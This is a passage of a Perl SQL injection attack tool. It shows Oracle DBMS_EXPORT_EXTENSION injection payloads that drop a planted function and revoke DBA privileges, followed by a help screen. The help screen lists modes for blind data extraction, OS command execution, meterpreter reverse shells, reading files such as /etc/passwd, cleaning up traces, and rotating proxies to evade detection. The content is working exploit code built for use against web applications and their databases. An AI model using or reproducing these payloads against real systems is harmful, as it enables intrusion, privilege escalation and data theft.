my $drop_func=" and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' drop function LinxReadFile'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";
my $url_2=$url.$drop_func;
print "\nsending url..\n\n";
my $content = get_or_post($method,$url_2,$cookie,$proxy) ;
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/$match/i)) 
	  {
        print "-----------------------------------------------\n";
    die "ERROR occured !!!...I could not drop the function!!! ...\n";
        print "-----------------------------------------------\n";
		print "cannot proceed";
		exit 0;
	} 
  
  else 
	  {
	          print "--------------------------------\n";
			  print "No Errors Encountered...Function dropped....\n";
              print "--------------------------------\n";
  
		}



}


if ($type==3) 
	{
############revoking dba privileges after data extraction############
		print "-----------------------------------------------\n";

		print "\nRevoking dba from public\n\n";

        print "-----------------------------------------------\n";

my $revokedbafrompub=" and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' revoke dba from public'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";
my $url_2=$url.$revokedbafrompub;
print "\nsending url..\n\n";
my $content = get_or_post($method,$url_2,$cookie,$proxy) ;
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/$match/i)) 
	  {
        print "-----------------------------------------------\n";
    die "ERROR occured !!!...I could not revoke the permissions, you should contact the client....\n";
        print "-----------------------------------------------\n";
		print "cannot proceed";
		exit 0;
	} 
  
  else 
	  {
	          print "--------------------------------\n";
			  print "No Errors Encountered...Permissions revoked....\n";
              print "--------------------------------\n";
  
		}


	}
############ Type 3 block ends here##################



	#print " total hits: $hits\n";
	my $blah= length($solution);
	if ($blah<2)
	{print "\n !!!!!!Errrrrrrr.. Something is not quite right.. see below!!!!!\n";
	 print "-------------------------------------------------------";
	 print "\n1 In a string based injection, vulnerable parameter must end with single quote(')\n\t eg. blah.php?id=foo'";
	 print "\n2 And don't forget to provide me a unique true response with -match";
	 print "\n3 Also Check that the SQL Query you supplied returns only one row\n";
	 print "\n4 BTW did you speify the right database (-database)\n";
	 print "-------------------------------------------------------\n\n\n";
	}
}

sub help {
	&banner();
		print " ---------------------usage:-------------------------------------------\n";
	print"\nInteger based Injection-->$0 - url http://www.host.com/path/script.php?foo=1000 [options]\n ";
	print "\nString Based Injection-->$0 - url http://www.host.com/path/script.php?foo=bar' [options]\n  ";
	print "\n ------------------------------------options:--------------------------\n";
	print " -sql:\t\tvalid SQL syntax to get; version(), database(),\n";
	print "\t\t\(select  table_name from inforamtion_schema.tables limit 1 offset 0)\n"; 
	print " -get: \t\tIf MySQL user is root, supply word readable file name\n";
	print " -blind:\tparameter to inject sql. Default is last value of url\n";
	print " -match:\t*RECOMMENDED* string to match in valid query, Default is auto\n";
	print " -nomatch:\t string to match in invalid query (must only appear in false scenario)\n";
	print " -start:\tif you know the beginning of the string, use it.\n";
	print " -length:\tmaximum length of value. Default is $default_length.\n";
	print " -time:\t\ttimer options:\n";
	print " \t0:\tdont wait. Default option.\n";
	print " \t1:\twait 15 seconds\n";
	print " \t2:\twait 5 minutes\n\n";
	print " -type:\t\tType of injection:\n";
	print " \t0:\tType 0 (default) is blind injection based on True and False responses\n";
	print " \t1:\tType 1 is blind injection based on True and Error responses\n";
	print " \t2:\tType 2 is injection in order by and group by \n";
	print " \t3:\tType 3 is extracting data with SYS privileges[ORACLE dbms_export_extension exploit]\n";
	print " \t4:\tType 4 is O.S code execution [ORACLE dbms_export_extension exploit]\n";
	print " \t5:\tType 5 is reading files [ORACLE dbms_export_extension exploit, based on java]\n\n";
	print " \t6:\tType 6 is O.S code execution [ORACLE DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC exploit]\n";
	print " \t7:\tType 7 is O.S code execution [ORACLE SYS.KUPP\$PROC.CREATE_MASTER_PROCESS(), DBA Privs]\n";
	print " \t\t -cmd=revshell [Type 7 supports meterpreter payload execution, run generator.exe first]\n";
	print " \t\t -cmd=cleanup [run this after exiting your metasploit session, it will clean up the traces]\n";
	print " \t8:\tType 8 is O.S code execution [ORACLE DBMS_JAVA_TEST.FUNCALL, with JAVA IO Permissions]\n";
	print " \t\t -cmd=revshell [Type 8 supports meterpreter payload execution, run generator.exe first]\n";
	print " -file:\tFile to read [default C:\\boot.ini] \n\n";
	print " -stype:\tHow you want to execute command:\n";
	print " \t0:\tSType 0 (default) is based on java..will NOT work against XE\n";
	print " \t1:\tSType 1 is against oracle 9 with plsql_native_make_utility\n";
	print " \t2:\tSType 2 is against oracle 10 with dbms_scheduler \n";
	print " -database:\tBackend database:\n";
	print " \t0:\tMS-SQL (Default)\n";
	print " \t1:\tMYSQL\n";
	print " \t2:\tPOSTGRES\n";
	print " \t3:\tORACLE\n";
	print " -rtime:\twait random seconds, for example: \"10-20\".\n";
	print " -method:\thttp method to use; get or post. Default is $default_method.\n";
	print " -cmd:\t\tcommand to execute(type 4 only). Default is \"$default_cmd.\"\n";
	print " -uagent:\thttp UserAgent header to use. Default is $default_useragent\n";
	print " -ruagent:\tfile with random http UserAgent header to use.\n";
	print " -cookie:\thttp cookie header to use\n";
	print " -rproxy:\tuse random http proxy from file list.\n";
	print " -proxy:\tuse proxy http. Syntax: -proxy=http://proxy:port/\n";
	print " -proxy_user:\tproxy http user\n";
	print " -proxy_pass:\tproxy http password\n";
    print "\n---------------------------- examples:-------------------------------\n";
	print "bash# $0 -url http://www.somehost.com/blah.php?u=5 -blind u -sql \"select table_name from imformation_schema.tables limit 1 offset 0\" -database 1 -type 1\n\n";
    print "bash# $0 -url http://www.buggy.com/bug.php?r=514&p=foo' -method post -get \"/etc/passwd\" -match \"foo\"\n";
    exit(1);
}
